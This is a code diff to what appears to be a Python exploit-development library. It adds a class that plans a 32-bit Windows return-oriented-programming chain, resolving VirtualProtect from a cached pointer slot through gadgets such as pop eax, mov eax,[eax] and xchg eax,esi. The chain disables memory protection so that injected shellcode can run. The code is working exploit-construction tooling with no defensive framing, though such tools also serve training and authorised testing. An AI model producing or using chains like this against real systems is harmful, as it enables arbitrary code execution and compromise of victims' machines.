@@ -264,3 +264,29 @@ class VirtualProtectChain:
     def _neg_size_has_null(self) -> bool:
         neg = (-self.shellcode_size) & 0xFFFFFFFF
         return 0 in struct.pack("<I", neg)
+
+
+class CachedVirtualProtectChain(VirtualProtectChain):
+    """PUSHAD planner that resolves `VirtualProtect` from a writable cache slot."""
+
+    REQUIRED_GADGETS: frozenset[str] = (
+        VIRTUALPROTECT_REQUIRED_GADGETS
+        - {"pop_esi_ret", "virtualprotect_ptr"}
+        | {"mov_eax_ptr_eax_ret", "xchg_eax_esi_ret"}
+    )
+
+    def __init__(self, *, cached_pointer_slot: int, **kwargs: int) -> None:
+        super().__init__(**kwargs)
+        if not 0 <= cached_pointer_slot <= 0xFFFFFFFF:
+            raise ValueError("cached_pointer_slot must fit in a DWORD")
+        self.cached_pointer_slot = cached_pointer_slot
+
+    def plan(self) -> list[ChainElement]:
+        chain = super().plan()
+        cached_load = [
+            GadgetRef("pop_eax_ret", "load cached VirtualProtect pointer slot into EAX"),
+            RawDword(self.cached_pointer_slot, "EAX <- cached VirtualProtect pointer slot"),
+            GadgetRef("mov_eax_ptr_eax_ret", "EAX <- [EAX] (resolved VirtualProtect)"),
+            GadgetRef("xchg_eax_esi_ret", "ESI <- resolved VirtualProtect pointer"),
+        ]
+        return chain[:2] + cached_load + chain[4:]
